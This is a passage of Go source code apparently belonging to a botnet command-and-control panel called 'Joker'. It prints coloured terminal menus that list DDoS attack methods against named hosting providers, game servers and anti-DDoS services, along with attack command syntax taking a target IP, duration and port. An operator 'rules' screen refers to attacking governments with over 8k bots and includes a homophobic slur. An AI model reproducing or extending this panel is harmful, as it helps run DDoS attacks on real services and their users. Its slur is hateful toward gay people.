                this.conn.Write([]byte("\033[38;5;236m        8  \033[38;5;216m 88MM::::::::::::::::::::::M:::M::::::::MM                        \r\n"))
                this.conn.Write([]byte("\033[38;5;216m            888MM::::::::::::::::::MM::::::MM::::::MM                        \r\n"))
                this.conn.Write([]byte("\033[38;5;216m           88888MM::::::::::::::MMM::::::::mM:::::M                          \r\n"))
                this.conn.Write([]byte("\033[38;5;216m          888888MM::::::::::::MMM::::::::::MMM:::M                           \r\n"))
                continue
        }
        if cmd == "apisend" {
            continue
        }
        if cmd == "testhelp" {
            this.conn.Write([]byte("\x1b[1;35m                                 ╦\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔═════════════════════════╗═════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mnfo-down .  ovh-down  \x1b[1;35m║   \x1b[1;32movh-crush .  dedipath \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mgame-nfo .  ovh-game  \x1b[1;35m║   \x1b[1;32mfivem-nfo .  serverv2 \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚╗════════════════════════╝════════════════════════╔╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32msy-killall   .  sy-killallv2  .  sy-killallv3  \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mcaptcha-down .  2k-21         .  ddos-guard    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mark-destroy  .  tcp-down      .  udp-downv2    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mudp-down     .  sy-kilallv4   .  server        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mvpn-down     .  od-down       .  redsyn        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mnfo-mob      .  aws-destroy   .  sos           \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔╝  \x1b[1;32m wra         .     odin     .   dns       .    sos   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║══════════════════════════════════════════════════╚╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║═══════════════════════════════════════════════════║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║        \x1b[1;32mapisend [METHOD [IP] [TIME] [PORT]         \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚═══════════════════════════════════════════════════╝\r\n"))
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔═════════════════════════╗═════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mnfo-down .  ovh-down  \x1b[1;35m║   \x1b[1;32movh-crush .  dedipath \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mgame-nfo .  ovh-game  \x1b[1;35m║   \x1b[1;32mfivem-nfo .  serverv2 \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚╗════════════════════════╝════════════════════════╔╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32msy-killall   .  sy-killallv2  .  sy-killallv3  \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mcaptcha-down .  2k-21         .  ddos-guard    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mark-destroy  .  tcp-down      .  udp-downv2    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mudp-down     .  sy-kilallv4   .  server        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mvpn-down     .  od-down       .  redsyn        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mnfo-mob      .  aws-destroy   .  sos           \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔╝  \x1b[1;32m wra         .     odin     .   dns       .    sos   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║══════════════════════════════════════════════════╚╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║═══════════════════════════════════════════════════║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║        \x1b[1;32mapisend [METHOD [IP] [TIME] [PORT]         \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚═══════════════════════════════════════════════════╝\r\n"))
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔═════════════════════════╗═════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mnfo-down .  ovh-down  \x1b[1;35m║   \x1b[1;32movh-crush .  dedipath \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mgame-nfo .  ovh-game  \x1b[1;35m║   \x1b[1;32mfivem-nfo .  serverv2 \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚╗════════════════════════╝════════════════════════╔╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32msy-killall   .  sy-killallv2  .  sy-killallv3  \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mcaptcha-down .  2k-21         .  ddos-guard    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mark-destroy  .  tcp-down      .  udp-downv2    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mudp-down     .  sy-kilallv4   .  server        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mvpn-down     .  od-down       .  redsyn        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mnfo-mob      .  aws-destroy   .  sos           \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔╝  \x1b[1;32m wra         .     odin     .   dns       .    sos   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║══════════════════════════════════════════════════╚╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║═══════════════════════════════════════════════════║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║        \x1b[1;32mapisend [METHOD [IP] [TIME] [PORT]         \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚═══════════════════════════════════════════════════╝\r\n"))
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔═════════════════════════╗═════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mnfo-down .  ovh-down  \x1b[1;35m║   \x1b[1;32movh-crush .  dedipath \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mgame-nfo .  ovh-game  \x1b[1;35m║   \x1b[1;32mfivem-nfo .  serverv2 \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚╗════════════════════════╝════════════════════════╔╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32msy-killall   .  sy-killallv2  .  sy-killallv3  \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mcaptcha-down .  2k-21         .  ddos-guard    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mark-destroy  .  tcp-down      .  udp-downv2    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mudp-down     .  sy-kilallv4   .  server        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mvpn-down     .  od-down       .  redsyn        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mnfo-mob      .  aws-destroy   .  sos           \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔╝  \x1b[1;32m wra         .     odin     .   dns       .    sos   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║══════════════════════════════════════════════════╚╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║═══════════════════════════════════════════════════║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║        \x1b[1;32mapisend [METHOD [IP] [TIME] [PORT]         \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚═══════════════════════════════════════════════════╝\r\n"))
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗╦═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ ╠╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝╩╚═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔═════════════════════════╗═════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mnfo-down .  ovh-down  \x1b[1;35m║   \x1b[1;32movh-crush .  dedipath \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mgame-nfo .  ovh-game  \x1b[1;35m║   \x1b[1;32mfivem-nfo .  serverv2 \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚╗════════════════════════╝════════════════════════╔╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32msy-killall   .  sy-killallv2  .  sy-killallv3  \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mcaptcha-down .  2k-21         .  ddos-guard    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mark-destroy  .  tcp-down      .  udp-downv2    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mudp-down     .  sy-kilallv4   .  server        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mvpn-down     .  od-down       .  redsyn        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mnfo-mob      .  aws-destroy   .  sos           \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔╝  \x1b[1;32m wra         .     odin     .   dns       .    sos   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║══════════════════════════════════════════════════╚╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║═══════════════════════════════════════════════════║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║        \x1b[1;32mapisend [METHOD [IP] [TIME] [PORT]         \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚═══════════════════════════════════════════════════╝\r\n"))
            continue
        }

        if cmd == "joker" || cmd == "JOKER" {
                    this.conn.Write([]byte("\033[2J\033[1H")) 
        this.conn.Write([]byte("\033[0m\r\n"))           
            this.conn.Write([]byte("\x1b[1;35m                                 ╦\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
        time.Sleep(50 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
        time.Sleep(50 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
        time.Sleep(50 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
        time.Sleep(50 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗╦═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ ╠╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝╩╚═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╚════════════════════════════════════════╝\r\n"))
            continue
        }

        if err != nil || cmd == "RULES" || cmd == "rules" {
            this.conn.Write([]byte("\033[37m                        ═══════════════\033[93m════════════════                 \r\n"))
            this.conn.Write([]byte("\033[37m                         no hitting gov\033[93mernment shit unless over 8k bots \r\n"))
            this.conn.Write([]byte("\033[37m                         no ddosing big\033[93m sites                           \r\n"))
            this.conn.Write([]byte("\033[37m                         no trying to h\033[93mit cloudflare...                 \r\n"))
            this.conn.Write([]byte("\033[37m                         no gays allowe\033[93md fucking retarded homos         \r\n"))
            this.conn.Write([]byte("\033[37m                        ═══════════════\033[93m════════════════                 \r\n"))
            continue
        }

        if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            time.Sleep(50 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte(fmt.Sprintf("\033]0;  Primitive | User: %s | UsersOnline: %d | Message: %s\007", username, len(sessions), motd)))
            this.conn.Write([]byte(banner()))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m\r\n"))
this.conn.Write([]byte("\x1b[38;2;45;31;171m             ╔═════════════════════════╗═════════════════════════╗\r\n"))
this.conn.Write([]byte("\x1b[38;2;45;31;171m             ║   \x1b[1;36mADMIN                 \x1b[38;2;45;31;171m║\x1b[1;36m   CHAT                  \x1b[38;2;45;31;171m║\r\n"))
this.conn.Write([]byte("\x1b[38;2;45;31;171m             ║   \x1b[1;36mMETHODS               \x1b[38;2;45;31;171m║\x1b[1;36m   DM                    \x1b[38;2;45;31;171m║\r\n"))
this.conn.Write([]byte("\x1b[38;2;45;31;171m             ╚╗════════════════════════╝════════════════════════╔╝\r\n"))
this.conn.Write([]byte("\x1b[38;2;45;31;171m              ║  \x1b[1;36mJOKER        .  USERS         .  CREDITS       \x1b[38;2;45;31;171m║\r\n"))
this.conn.Write([]byte("\x1b[38;2;45;31;171m              ║  \x1b[1;36mBROADCAST    . SUPPORT-TICKET .  HISTORY       \x1b[38;2;45;31;171m║\r\n"))
this.conn.Write([]byte("\x1b[38;2;45;31;171m              ║  \x1b[1;36mDDG          .  CLS           .  THEMES        \x1b[38;2;45;31;171m║\r\n"))
this.conn.Write([]byte("\x1b[38;2;45;31;171m             ╔╝═════════════════════════════════════════════════╚╗\r\n"))
this.conn.Write([]byte("\x1b[38;2;45;31;171m             ║═══════════════════════════════════════════════════║\r\n"))
this.conn.Write([]byte("\x1b[38;2;45;31;171m             ║        \x1b[1;36m.attack [Attack options]                   \x1b[38;2;45;31;171m║\r\n"))
this.conn.Write([]byte("\x1b[38;2;45;31;171m             ╚═══════════════════════════════════════════════════╝  \r\n"))          
            this.conn.Write([]byte("\r\n"))
            continue
        }
        if err != nil || cmd == "BANG" || cmd == "bang" {
    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
    
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
